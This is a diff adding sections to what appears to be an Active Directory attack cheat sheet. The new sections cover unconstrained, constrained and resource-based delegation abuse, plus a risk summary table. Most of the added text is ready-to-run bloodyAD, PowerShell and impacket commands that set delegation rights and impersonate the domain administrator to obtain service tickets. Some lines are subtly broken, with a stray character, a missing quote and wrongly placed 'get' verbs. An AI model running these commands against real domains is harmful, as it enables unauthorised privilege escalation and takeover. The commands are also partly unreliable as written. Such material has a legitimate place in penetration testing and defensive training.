@@ -187,6 +187,42 @@ netexec ldap DC-IP -d domain -u username -p password --gmsa
 bloodyAD --host DC-Hostname -d domain -u username -p password get object TargetObject --attr msDS-ManagedPassword
 ```
 
+
+
+## UnConstained Delegation
+```
+bloodyAD --host DC-Hostname -d domain -u username -p password get add uac TargetComputer -f TRUSTED_FOR_DELEGATION
+```
+
+
+
+## Constained Delegation
+1- Method 1: Configure constrained delegation from linux
+```
+bloodyAD --host DC-Hostname -d domain -u username -p password get add uac TargetComputer -f TRUSTED_TO_AUTH_FOR_DELEGATION
+bloodyAD --host DC-Hostname -d domain -u username -p password get set object TargetComputer msDS-AllowedToDelegateTo -v 'ldap/DC-FQDN' -v 'cifs/DC-FQDN'
+```
+
+2- Method 2: Configure constrained delegation from Windows
+```
+Set-ADAccountControl -Identity TargetComputer -TrustedToAuthForDelegation $True
+Set-ADObject -Identity "CN=TargetComputer-DN" -Add @{"msDS-AllowedToDelegateTo"=@("ldap/DC-FQDN","cifs/DC-FQDN")}
+```
+
+
+
+## RBCD
+> AddAllowedToAct means that this user can edit the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer object. 
+```
+impacket-rbcd -delegate-from compromised_computer -delegate-to target_computer -dc-ip DC-IP -action write 'domain/username:password'
+impacket-getST -spn 'cifs/target_computer' -impersonate administrator -dc-ip DC-IP 'domain/compromised_computer:password
+KRB5CCNAME=administrator.ccache nxc smb 1target_computer -k --use-kcache  
+```
+
+
+
+
+
 🔹 Impact:
 
 * Extract service account credentials
@@ -208,6 +244,17 @@ bloodyAD --host DC-Hostname -d domain -u username -p password get object TargetO
 | ReadGMSAPassword    | Service account compromise                          |
 
 ---
+
+# 🔹 Summary of Delegation Types
+
+| Type                     | Key Attribute                              | Risk Level | Description                    |
+| ------------------------ | ------------------------------------------ | ---------- | ------------------------------ |
+| Unconstrained Delegation | `TRUSTED_FOR_DELEGATION`                   | 🔴 High    | Can impersonate any user       |
+| Constrained Delegation   | `msDS-AllowedToDelegateTo`                 | 🟠 Medium  | Limited to specific services   |
+| RBCD                     | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 🔴 High    | Resource-controlled delegation |
+
+---
+
 
 # 🔹 Key Takeaways
 
